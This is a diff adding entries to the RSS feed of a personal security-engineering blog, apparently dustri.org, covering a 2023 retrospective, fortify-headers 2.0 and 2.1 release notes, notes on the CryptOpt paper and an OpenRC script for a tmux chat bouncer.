+&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Vampyr_(video_game)"&gt;Vampyr&lt;/a&gt;, because
+  I miss &lt;a href="https://en.wikipedia.org/wiki/Vampire:_The_Masquerade_%E2%80%93_Bloodlines"&gt;Vampire: The Masquerade – Bloodlines&lt;/a&gt;. It could have been so much more instead of being "meh".&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Ported &lt;a href="https://github.com/jvoisin/snuffleupagus"&gt;Snuffleupagus&lt;/a&gt; to PHP8.3.&lt;/li&gt;
+&lt;li&gt;Contributed to a couple of software:&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://github.com/lite-xl/lite-xl/pulls?q=is%3Apr+author%3Ajvoisin"&gt;lite-xl&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://alpinelinux.org/"&gt;Alpine linux&lt;/a&gt;, by:&lt;ul&gt;
+&lt;li&gt;becoming a &lt;a href="https://pkgs.alpinelinux.org/packages?branch=edge&amp;amp;repo=&amp;amp;arch=&amp;amp;maintainer=Julien%20Voisin"&gt;package maintainer&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://gitlab.alpinelinux.org/alpine/tsc/-/issues/64"&gt;documenting a bit&lt;/a&gt; the compiler-based mitigations,
+  and &lt;a href="https://gitlab.alpinelinux.org/alpine/abuild/-/merge_requests/221"&gt;enabling some missing ones&lt;/a&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Because of &lt;a href="https://runzero.com"&gt;runZero&lt;/a&gt;, I&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://github.com/rapid7/recog/pulls?q=+is%3Apr+author%3Ajvoisin"&gt;contributed to recog&lt;/a&gt; to improve some of its fingerprints;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/Sonarr/Sonarr/issues/5601"&gt;made it less trivial&lt;/a&gt; to detect Sonarr/Lidarr/Radarr/… versions.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/struct/isoalloc/pulls?q=is%3Apr+author%3Ajvoisin+created%3A2023"&gt;isoalloc&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/pygments/pygments/commits?author=jvoisin"&gt;pygments&lt;/a&gt;, mainly by adding lexers.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/morpheus65535/bazarr/pull/2304"&gt;bazaar&lt;/a&gt;, making it work on Alpine Linux.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/google/oss-fuzz/pulls?q=is%3Apr+author%3Ajvoisin"&gt;oss-fuzz&lt;/a&gt;,
+  including some &lt;a href="https://github.com/guidovranken/python-library-fuzzers/pulls?q=is%3Apr+author%3Ajvoisin"&gt;python fuzzers&lt;/a&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/daanx/mimalloc-bench"&gt;mimalloc-bench&lt;/a&gt;,
+  resulting in some &lt;a href="https://github.com/microsoft/snmalloc/pull/587#issuecomment-1442077886"&gt;real world improvements&lt;/a&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/quodlibet/mutagen/pulls/jvoisin"&gt;mutagen&lt;/a&gt;, since it's
+  used by &lt;a href="https://0xacab.org/jvoisin/mat2"&gt;mat2&lt;/a&gt;. I even &lt;a href="https://github.com/google/oss-fuzz/pull/10072"&gt;integrated it into
+  OSS-Fuzz&lt;/a&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/rapid7/metasploit-framework/pulls?q=is%3Apr+jvoisin"&gt;metasploit&lt;/a&gt;,
+by doing a lot of code reviews for pull-requests, and landing some modules,
+  like a &lt;a href="https://github.com/rapid7/metasploit-framework/pull/17711"&gt;SPIP RCE&lt;/a&gt;,
+  courtesy of &lt;a href="https://thinkloveshare.com/"&gt;Laluka&lt;/a&gt; and &lt;a href="https://twitter.com/coiffeur0x90"&gt;coiffeur&lt;/a&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://chrony.tuxfamily.org/"&gt;chrony&lt;/a&gt;, spending some time debugging
+  &lt;a href="https://mail-archive.com/chrony-dev@chrony.tuxfamily.org/msg02572.html"&gt;how to enable its seccomp sandbox&lt;/a&gt;
+  on Alpine Linux, resulting in a &lt;a href="https://gitlab.alpinelinux.org/alpine/aports/-/issues/14891#note_316587"&gt;couple of improvements&lt;/a&gt;,
+  and of course a &lt;a href="https://gitlab.alpinelinux.org/alpine/aports/-/merge_requests/47087"&gt;now-enabled-by-default sandbox&lt;/a&gt; there.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Got a CVE for a bug I &lt;a href="https://github.com/py-pdf/pypdf/security/advisories/GHSA-jrm6-h9cq-8gqw"&gt;reported&lt;/a&gt; in 2020!&lt;/li&gt;
+&lt;li&gt;Kept maintaining &lt;a href="https://openmw.org"&gt;OpenMW&lt;/a&gt;'s infrastructure.&lt;/li&gt;
+&lt;li&gt;Learnt some &lt;a href="https://en.wikipedia.org/wiki/Rust_(programming_language)"&gt;Rust&lt;/a&gt; so I could hang out with the cool kids.&lt;/li&gt;
+&lt;li&gt;Helped organise the &lt;a href="http://g.co/ctf"&gt;GoogleCTF&lt;/a&gt;, which was &lt;a href="https://ctftime.org/event/1929"&gt;pretty well received&lt;/a&gt;.&lt;/li&gt;
+&lt;li&gt;Added more possible subtitles to this blog, bringing their numbers above 1100.&lt;/li&gt;
+&lt;li&gt;Reduced the size of this website's webpages; most should now be around 10kb.&lt;/li&gt;
+&lt;li&gt;Contributed a bit to Wikipedia, in &lt;a href="https://en.wikipedia.org/wiki/Special:Contributions/jvoisin"&gt;English&lt;/a&gt; and in &lt;a href="https://fr.wikipedia.org/wiki/Sp%C3%A9cial:Contributions/jvoisin"&gt;French&lt;/a&gt;
+  under my usual nickname.&lt;/li&gt;
+&lt;li&gt;Moved my emails away from &lt;a href="https://gandi.net"&gt;Gandi&lt;/a&gt; over to &lt;a href="https://migadu.com"&gt;Migadu&lt;/a&gt;,
+  given their &lt;a href="https://chatting.neocities.org/posts/2023-gandi-pricing"&gt;ludicrous&lt;/a&gt; post-acquisition price increase.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/jvoisin/compiler-flags-distro"&gt;Investigated&lt;/a&gt; what
+  hardening-related compiler flags where enabled by default by popular Linux
+  distributions.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://tests.stockfishchess.org/users#jvoisin"&gt;Contributed a bit&lt;/a&gt; (by crunching numbers) to &lt;a href="https://stockfishchess.org/"&gt;Stockfish&lt;/a&gt;,
+  an open-source chess engine with an &lt;a href="https://en.wikipedia.org/wiki/Elo_rating_system"&gt;Elo rating&lt;/a&gt;
+  around &lt;a href="https://computerchess.org.uk/ccrl/4040/rating_list_all.html"&gt;3500&lt;/a&gt;.&lt;/li&gt;
+&lt;li&gt;Got featured a couple of times on Hackernew/reddit/lobste.rs/… frontpage,
+  thanks to a &lt;s&gt;&lt;a href="https://www.reddit.com/r/karma/wiki/index/faq/"&gt;karma&lt;/a&gt; junkie&lt;/s&gt;
+  marketing-able &lt;a href="https://dijit.sh"&gt;friend&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Kept maintaining &lt;a href="https://nos-oignons.net/"&gt;Nos Oignons&lt;/a&gt;'s infrastructure with &lt;a href="https://corl3ss.com/"&gt;corl3ss&lt;/a&gt;.
+  We're back at handling &lt;a href="https://nos-oignons.net/Services/index.en.html"&gt;around 2%&lt;/a&gt;
+  of tor's exit traffic! Our little non-profit is now 10 years old.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/jvoisin/fortify-headers"&gt;Took over&lt;/a&gt; the development and maintenance of 
+  &lt;a href="https://u.2f30.org/sin/"&gt;sin&lt;/a&gt;'s &lt;a href="https://git.2f30.org/fortify-headers/"&gt;fortify-headers&lt;/a&gt;.
+  It's used by &lt;a href="https://openwrt.org/"&gt;OpenWrt&lt;/a&gt;, &lt;a href="https://www.alpinelinux.org/"&gt;Alpine Linux&lt;/a&gt;,
+  and &lt;a href="https://bugs.gentoo.org/546692"&gt;soon&lt;/a&gt; in &lt;a href="https://wiki.gentoo.org/wiki/Project:Musl"&gt;Gentoo Hardened's musl flavour&lt;/a&gt;.&lt;/li&gt;
+&lt;li&gt;Ported my resume/cover letter template from
+  &lt;a href="https://latex-project.org"&gt;LaTeX&lt;/a&gt; to
+  &lt;a href="https://typst.app/docs/guides/guide-for-latex-users/"&gt;typst&lt;/a&gt; and felt so
+  much joy purging away all the LaTeX/TeXLive/XeTeX/LuaTeX/… garbage from my computer,
+  to never have to touch it again.&lt;/li&gt;
+&lt;li&gt;Got a "Documented Feedback from Employee Relations" from HR at work for
+  saying "Awkward to have yet another middle aged rich white het guy come talk
+  about diversity and inclusion." on an internal chatroom, about &lt;a href="https://booleanblackbelt.com/who-is-the-boolean-black-belt/"&gt;this middle
+  aged rich white het guy&lt;/a&gt;
+  invited to give an internal talk about diversity and inclusion.&lt;/li&gt;
+&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">jvoisin</dc:creator><pubDate>Sun, 31 Dec 2023 23:59:00 +0100</pubDate><guid isPermaLink="false">tag:dustri.org,2023-12-31:/b/2023-in-retrospect.html</guid><category>misc</category></item><item><title>fortify-headers 2.1</title><link>https://dustri.org/b/fortify-headers-21.html</link><description>&lt;p&gt;Only 4 days after the &lt;a href="https://dustri.org/b/fortify-headers-20.html"&gt;release&lt;/a&gt; of
+&lt;a href="https://github.com/jvoisin/fortify-headers"&gt;fortify-headers&lt;/a&gt;,
+here is the &lt;a href="https://github.com/jvoisin/fortify-headers/releases/tag/2.1"&gt;2.1&lt;/a&gt;,
+fixing a couple of portability issues and tidying a bit the code.
+&lt;a href="https://chimera-linux.org/"&gt;Chimera Linux&lt;/a&gt; users are
+&lt;a href="https://github.com/chimera-linux/cports/commit/a26be649d8a13c1012d5e165055d354a6bab1af8"&gt;as of today&lt;/a&gt;
+&lt;del&gt;test driving&lt;/del&gt; benefiting from it.&lt;/p&gt;
+&lt;h2&gt;Changelog&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Remove superfluous includes from the headers&lt;/li&gt;
+&lt;li&gt;Put some functions in to their proper files&lt;/li&gt;
+&lt;li&gt;Add a missing include in &lt;code&gt;sys/select.h&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Do not use static inline for C++ to avoid &lt;a href="https://en.wikipedia.org/wiki/One_Definition_Rule"&gt;ODR&lt;/a&gt;-wise violation&lt;/li&gt;
+&lt;li&gt;Guard some conditional stdio APIs with the right macros&lt;/li&gt;
+&lt;li&gt;Fix a typo that would prevent C++ code from compiling correctly&lt;/li&gt;
+&lt;li&gt;Rename macros to be more namespace-friendly&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Implementation details&lt;/h2&gt;
+&lt;p&gt;Including parts from the
+&lt;a href="https://en.wikipedia.org/wiki/Standard_library"&gt;stdlib&lt;/a&gt; in fortify means that
+programs that don't correctly include everything they need might compile, even
+though they shouldn't. Fortunately, the only bits used are either:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;size_t&lt;/code&gt;, which can be obtained by using &lt;code&gt;typeof(sizeof(char))&lt;/code&gt;,
+  since it's by definition the type returned by &lt;code&gt;sizeof&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;constants like &lt;code&gt;PATH_MAX&lt;/code&gt; (that we can define to &lt;code&gt;4096&lt;/code&gt;), &lt;code&gt;MB_LEN_MAX&lt;/code&gt;
+  (defined as 16), ...&lt;/li&gt;
+&lt;li&gt;eldritch constructs like &lt;a href="https://www.man7.org/linux/man-pages/man3/MB_CUR_MAX.3.html"&gt;&lt;code&gt;MB_CUR_MAX&lt;/code&gt;&lt;/a&gt;,
+  whose usage we hide behind an &lt;code&gt;#ifdef&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The other big thing is the one caught by &lt;a href="https://github.com/ssbr"&gt;Devin Jeanpierre&lt;/a&gt;, the usage of &lt;code&gt;static
+inline&lt;/code&gt; while &lt;a href="https://en.cppreference.com/w/c/language/inline"&gt;absolutely alright in C&lt;/a&gt;,
+is problematic in C++, because of the &lt;a href="https://en.wikipedia.org/wiki/One_Definition_Rule"&gt;One Definition Rule&lt;/a&gt;:
+In C++, if a function is declared inline, it must be declared inline in every translation unit, and also every
+definition of an inline function must be exactly the same (while in C they may
+be different.) On the other hand, C++ allows non-const function-local
+statics and all function-local statics from different definitions of an inline
+function are the same in C++, but distinct in C.
+More practically, calling &lt;code&gt;FORTIFY_INLINE&lt;/code&gt; functions from an inline function in C++, and including
+the header defining that inline function in more than one &lt;a href="https://en.wikipedia.org/wiki/Translation_unit_%28programming%29"&gt;translation
+unit&lt;/a&gt; results
+in undefined behaviour. The fix is easy, and was
+&lt;a href="https://github.com/jvoisin/fortify-headers/commit/c607773a80e6685ab4c922245c33cf2ea5dcfb72"&gt;commited&lt;/a&gt;
+by &lt;a href="https;//github.com/q66"&gt;q66&lt;/a&gt;: use &lt;code&gt;static&lt;/code&gt; instead of &lt;code&gt;static inline&lt;/code&gt; in C++.&lt;/p&gt;
+&lt;p&gt;Thanks &lt;a href="https://github.com/ssbr"&gt;Devin Jeanpierre&lt;/a&gt; for spending time to look at
+C++ compatibility, &lt;a href="https://github.com/q66"&gt;q66&lt;/a&gt; for his patches, willingness to ship
+fortify-headers in Chimera, and becoming co-maintainer.&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">jvoisin</dc:creator><pubDate>Sat, 16 Dec 2023 20:30:00 +0100</pubDate><guid isPermaLink="false">tag:dustri.org,2023-12-16:/b/fortify-headers-21.html</guid><category>security</category></item><item><title>fortify-headers 2.0</title><link>https://dustri.org/b/fortify-headers-20.html</link><description>&lt;p&gt;8 months ago, I started to contribute to &lt;a href="https://git.2f30.org/fortify-headers/"&gt;fortify-headers&lt;/a&gt;,
+a standalone &lt;a href="https://gcc.gnu.org/legacy-ml/gcc-patches/2004-09/msg02055.html"&gt;fortify-source&lt;/a&gt; implementation,
+with the goal of implementing &lt;code&gt;FORTIFY_SOURCE=3&lt;/code&gt;, since the current version
+only implemented &lt;code&gt;FORTIFY_SOURCE=2&lt;/code&gt;. I reached out to
+&lt;a href="https://u.2f30.org/sin/"&gt;sin&lt;/a&gt;, the original maintainer, to ask if he was
+interested in my changes, and he told me the project wasn't maintained
+anymore. But he would be happy to give me the commit bit instead. I spent
+some months &lt;a href="https://github.com/jvoisin/fortify-headers"&gt;writing code&lt;/a&gt; before
+accepting, to see if it would be a good idea: Would I be able to maintain it?
+To improve it? Add more features? and so on. Turns out the answer is yes, and
+I'm thus happy to announce the immediate availability of &lt;a href="https://git.2f30.org/fortify-headers/refs.html"&gt;fortify-headers
+2.0&lt;/a&gt;!&lt;/p&gt;
+&lt;h2&gt;Changelog&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Added clang support, based on &lt;a href="https://github.com/q66"&gt;q66&lt;/a&gt;'s patches.&lt;/li&gt;
+&lt;li&gt;Fixed a 64b-related incompatibility around &lt;code&gt;ppoll&lt;/code&gt; &lt;/li&gt;
+&lt;li&gt;Added a ton of tests, with &lt;a href="https://jvoisin.github.io/fortify-headers/"&gt;around 90% of coverage&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Made use of &lt;code&gt;__builtin_dynamic_object_size&lt;/code&gt; when &lt;code&gt;FORTIFY_SOURCE=3&lt;/code&gt; is used,
+  instead of &lt;code&gt;__builtin_object_size&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Made use of &lt;a href="https://clang.llvm.org/docs/AttributeReference.html"&gt;attributes&lt;/a&gt;:
+  &lt;a href="https://clang.llvm.org/docs/AttributeReference.html#alloc-size"&gt;alloc_size&lt;/a&gt;,
+  &lt;a href="https://clang.llvm.org/docs/AttributeReference.html#diagnose-as-builtin"&gt;diagnose_as_builtin&lt;/a&gt;,
+  &lt;a href="https://clang.llvm.org/docs/AttributeReference.html#diagnose-if"&gt;diagnose_if&lt;/a&gt;,
+  &lt;a href="https://clang.llvm.org/docs/AttributeReference.html#format"&gt;format&lt;/a&gt;,
+  &lt;a href="https://clang.llvm.org/docs/AttributeReference.html#malloc"&gt;malloc&lt;/a&gt;,
+  &lt;a href="https://clang.llvm.org/docs/AttributeReference.html#nodiscard-warn-unused-result"&gt;warn_unused_result&lt;/a&gt;,
+  …&lt;/li&gt;
+&lt;li&gt;Added some missing functions, like &lt;code&gt;calloc&lt;/code&gt;, &lt;code&gt;fdopen&lt;/code&gt;, &lt;code&gt;fmemopen&lt;/code&gt;, &lt;code&gt;fprintf&lt;/code&gt;,
+  &lt;code&gt;malloc&lt;/code&gt;, &lt;code&gt;memchr&lt;/code&gt;, &lt;code&gt;popen&lt;/code&gt;, &lt;code&gt;printf&lt;/code&gt;, &lt;code&gt;qsort&lt;/code&gt;, &lt;code&gt;umask&lt;/code&gt;, …&lt;/li&gt;
+&lt;li&gt;Added continuous integration, both on clang and gcc, covering the whole range
+  of supported versions across the latest Ubuntu LTS.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Implementation details&lt;/h2&gt;
+&lt;p&gt;Since this is a pretty uncommon piece of software, friends of mine have been
+asking me details about the involved black magic.
+While it's possible to overload functions with the
+&lt;a href="https://clang.llvm.org/docs/AttributeReference.html#overloadable"&gt;overloadable&lt;/a&gt;
+attribute in C, there isn't really something similar for drive-by overloading.
+Fortunately, it's possible to hack an equivalent by combining
+&lt;a href="https://gcc.gnu.org/onlinedocs/cpp/Wrapper-Headers.html"&gt;&lt;code&gt;#include_next&lt;/code&gt;&lt;/a&gt; with
+the following macros:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;#define _FORTIFY_STR(s) #s&lt;/span&gt;
+&lt;span class="cp"&gt;#define _FORTIFY_ORIG(p, fn) __typeof__(fn) __orig_##fn __asm__(_FORTIFY_STR(p) #fn)&lt;/span&gt;
+&lt;span class="cp"&gt;#define _FORTIFY_FNB(fn) _FORTIFY_ORIG(__USER_LABEL_PREFIX__, fn)&lt;/span&gt;
+&lt;span class="cp"&gt;#define _FORTIFY_FN(fn) _FORTIFY_FNB(fn); _FORTIFY_INLINE&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;This makes the original function available when prefixed with &lt;code&gt;__orig&lt;/code&gt;,
+while allowing overloading.
+On clang, the &lt;a href="https://clang.llvm.org/docs/AttributeReference.html#pass-object-size-pass-dynamic-object-size"&gt;&lt;code&gt;pass_object_size&lt;/code&gt;/&lt;code&gt;pass_dynamic_object_size&lt;/code&gt;&lt;/a&gt;
+attribute is used to pass down arguments size; the assembly label preventing
+weird &lt;a href="https://en.wikipedia.org/wiki/Name_mangling"&gt;mangling&lt;/a&gt; issues. Since
+it's only a label, despite being assembly, it's still portable across various
+architectures. The &lt;code&gt;_FORTIFY_INLINE&lt;/code&gt; macro contains all possible "please inline this
+function" directives as possible, to avoid polluting the symbols.&lt;/p&gt;
+&lt;p&gt;There is of course a ton of &lt;code&gt;#ifdef&lt;/code&gt;/&lt;code&gt;#if __has_atribute&lt;/code&gt;/… to work around various
+compiler intrinsics, like clang missing &lt;code&gt;__builtin_va_arg_pack&lt;/code&gt; or gcc missing
+&lt;code&gt;diagnose_if&lt;/code&gt;, so that fortify-headers will always make use of the most
+features available.&lt;/p&gt;
+&lt;p&gt;It is indeed a particularly gross pile of hacks,
+but this is C, also known as "nice things and why we can't have them."&lt;/p&gt;
+&lt;p&gt;Thanks to &lt;a href="https://u.2f30.org/sin/"&gt;sin&lt;/a&gt; for creating the project and
+maintaining it for years, &lt;a href="https://daniel.micay.dev"&gt;strcat&lt;/a&gt; for his inspiring
+work on fortifying &lt;a href="https://en.wikipedia.org/wiki/Bionic_(software)"&gt;bionic&lt;/a&gt;,
+&lt;a href="https://github.com/q66"&gt;q66&lt;/a&gt; for his clang patches and general support,
+the friendly people from &lt;a href="https://2f30.org"&gt;2f30&lt;/a&gt; for their patience,
+&lt;a href="http://serge.liyun.free.fr/serge/"&gt;Serge Sans Paille&lt;/a&gt; for his &lt;a href="https://github.com/serge-sans-paille/fortify-test-suite"&gt;testsuite&lt;/a&gt;,
+&lt;a href="https://people.freebsd.org/~kevans/"&gt;kevans&lt;/a&gt; for his work on fortifying
+&lt;a href="https://reviews.freebsd.org/D32306"&gt;FreeBSD's libc&lt;/a&gt;,
+Red Hat from pushing &lt;code&gt;FORTIFY_SOURCE=2&lt;/code&gt; and &lt;code&gt;FORTIFY_SOURCE=3&lt;/code&gt; forward,
+...&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">jvoisin</dc:creator><pubDate>Tue, 12 Dec 2023 23:30:00 +0100</pubDate><guid isPermaLink="false">tag:dustri.org,2023-12-12:/b/fortify-headers-20.html</guid><category>security</category></item><item><title>Paper notes: CryptOpt</title><link>https://dustri.org/b/paper-notes-cryptopt.html</link><description>&lt;ul&gt;
+&lt;li&gt;Full title: CryptOpt: Verified Compilation with Randomized Program Search for Cryptographic Primitives&lt;/li&gt;
+&lt;li&gt;PDF: &lt;a href="https://arxiv.org/abs/2211.10665"&gt;arXiv&lt;/a&gt; (&lt;a href="https://dustri.org/b/files/papers/cryptopt.pdf"&gt;local mirror&lt;/a&gt;)&lt;/li&gt;
+&lt;li&gt;Authors: Joel Kuepper, Andres Erbsen, Jason Gross, Owen Conoly, Chuyue Sun, Samuel Tian, David Wu, Adam Chlipala, Chitchanok Chuengsatiansup, Daniel Genkin, Markus Wagner, Yuval Yarom&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Cryptography is hard, high-performance one even more so: formal proof of
+assembly implementations is horrible to model, and code generation from 
+formal proofs are hard to lower to high-performance assembly. The core idea of
+CryptOpt is to treat this as a black box combinatorial optimization problem,
+and bruteforce possible solutions in a smart way against an oracle.&lt;/p&gt;
+&lt;p&gt;More precisely:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;start from a known-correct implementation in
+  &lt;a href="https://github.com/mit-plv/fiat-crypto"&gt;fiat-crypto&lt;/a&gt; (a
+  coq-powered high-level to low-level IR proven translator) low-level IR;&lt;/li&gt;
+&lt;li&gt;lower it via a fuzzer-like machinery replacing/reordering operands
+   applying semantics-and-data-constrains-preserving transformations, which has an acceptable
+   search space because:&lt;ul&gt;
+&lt;li&gt;it's straight-line no-aliasing constant-offset-pointers assembly;&lt;/li&gt;
+&lt;li&gt;transformations can be templatised, eg. &lt;code&gt;add ≍ clc; adcx&lt;/code&gt;;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;lift the resulting x64 assembly to fiat-crypto low-level IR;&lt;/li&gt;
+&lt;li&gt;use a custom &lt;a href="https://en.wikipedia.org/wiki/E-graph"&gt;e-graph&lt;/a&gt; based 
+  &lt;em&gt;equivalence checker&lt;/em&gt; implemented as a mix between an SMT solver and a symbolic-execution engine;&lt;/li&gt;
+&lt;li&gt;if the new implementation is correct, benchmark it against the current;
+   fastest one, and keep it if it's outperforming it.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;goto 2&lt;/code&gt;.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;This approach has a couple of advantages:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;fuzzers are cheaper than highly specialised engineering time&lt;/li&gt;
+&lt;li&gt;porting implementations to new hardware is simply a matter of
+  running CryptOpt on it.&lt;/li&gt;
+&lt;li&gt;by lifting the assembly to fiat-crypto low-level IR,
+  there is no need to write complex formal proofs,
+  since fiat-crypto is already taking care of those.&lt;/li&gt;
+&lt;li&gt;controlling the mutations allows to ensure that
+  the implementation stays side-channel free.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The main issue though, is that one needs to formally implement 
+whatever algorithm to optimize in fiat-crypto, which is not that easy (and
+which the authors of the paper didn't do for libsecp256k1).&lt;/p&gt;
+&lt;p&gt;Implementation-wise, the author ran 200k mutations, with 20 initial candidates,
+over 18 Fiat IR primitives, taking between 20 and 40 CPU hours. Interestingly,
+since the equivalence-based verification is &lt;em&gt;slow&lt;/em&gt; (between 0.1s and ~300s),
+it's only done once at the end. They found out that "optimization progress is roughly logarithmic
+in the number of mutations." CryptOpt generates code around 1.20 to 2.50 times
+faster than gcc/clang for the same fiat-crypto generated C code. It's not
+faster then OpenSSL (but offers formally verified correctness), but is
+faster than libsecp256k1.&lt;/p&gt;
+&lt;p&gt;The paper was &lt;a href="https://iacr.org/submit/files/slides/2023/rwc/rwc2023/85/slides.pdf"&gt;presented&lt;/a&gt; at &lt;a href="https://rwc.iacr.org/2023/program.php"&gt;Real World Crypto 2023&lt;/a&gt;,
+and like all good one, it came with an &lt;a href="https://github.com/0xADE1A1DE/CryptOpt"&gt;implementation&lt;/a&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">jvoisin</dc:creator><pubDate>Fri, 01 Dec 2023 12:30:00 +0100</pubDate><guid isPermaLink="false">tag:dustri.org,2023-12-01:/b/paper-notes-cryptopt.html</guid><category>paper_notes</category></item><item><title>Managing a bouncer via OpenRC</title><link>https://dustri.org/b/managing-a-bouncer-via-openrc.html</link><description>&lt;p&gt;I'm an avid &lt;a href="https://en.wikipedia.org/wiki/Internet_Relay_Chat"&gt;IRC&lt;/a&gt;
+user, and I'm using &lt;a href="https://en.wikipedia.org/wiki/XMPP"&gt;XMPP&lt;/a&gt; to idle on
+&lt;a href="https://tails.net/support/index.en.html"&gt;Tails&lt;/a&gt;' chatrooms. Since protocols
+tend to only work when one is connected, they're both running inside a
+&lt;a href="https://github.com/tmux/tmux"&gt;tmux&lt;/a&gt; session, acting as a
+&lt;a href="https://en.wikipedia.org/wiki/BNC_(software)"&gt;bouncer&lt;/a&gt;.
+But now that my hypervisor is automatically rebooting to apply security updates,
+and during power cuts via &lt;a href="https://networkupstools.org/"&gt;nut&lt;/a&gt;,
+I needed a way to automatically restart the bouncer. Since
+it's running in an &lt;a href="https://www.alpinelinux.org/"&gt;Alpine Linux&lt;/a&gt; container,
+here is my solution in the form of an &lt;a href="https://github.com/OpenRC/openrc"&gt;OpenRC&lt;/a&gt;
+service script, because I couldn't find one on the internet:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="ch"&gt;#!/sbin/openrc-run&lt;/span&gt;
+
+&lt;span class="nv"&gt;USER&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;jvoisin
+
+&lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;chat&amp;quot;&lt;/span&gt;
+&lt;span class="nv"&gt;command_user&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$USER&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="nv"&gt;command&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/bin/tmux
+&lt;span class="nv"&gt;command_args&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;new-session -s chat -d &amp;#39;/usr/bin/weechat&amp;#39; \; new-window &amp;#39;/usr/bin/profanity&amp;#39; \; select-window -t -1&amp;quot;&lt;/span&gt;
+&lt;span class="nv"&gt;pidfile&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/run/&lt;/span&gt;&lt;span class="nv"&gt;$SVCNAME&lt;/span&gt;&lt;span class="s2"&gt;.pid&amp;quot;&lt;/span&gt;
+
+depend&lt;span class="o"&gt;()&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;{&lt;/span&gt;
+&lt;span class="w"&gt;        &lt;/span&gt;need&lt;span class="w"&gt; &lt;/span&gt;net
+&lt;span class="w"&gt;        &lt;/span&gt;use&lt;span class="w"&gt; &lt;/span&gt;dns&lt;span class="w"&gt; &lt;/span&gt;
+&lt;span class="o"&gt;}&lt;/span&gt;&lt;span class="w"&gt;              &lt;/span&gt;
+
+stop&lt;span class="o"&gt;()&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;{&lt;/span&gt;
+&lt;span class="w"&gt;        &lt;/span&gt;su&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$USER&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;-c&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;tmux kill-session chat&amp;#39;&lt;/span&gt;
+&lt;span class="o"&gt;}&lt;/span&gt;
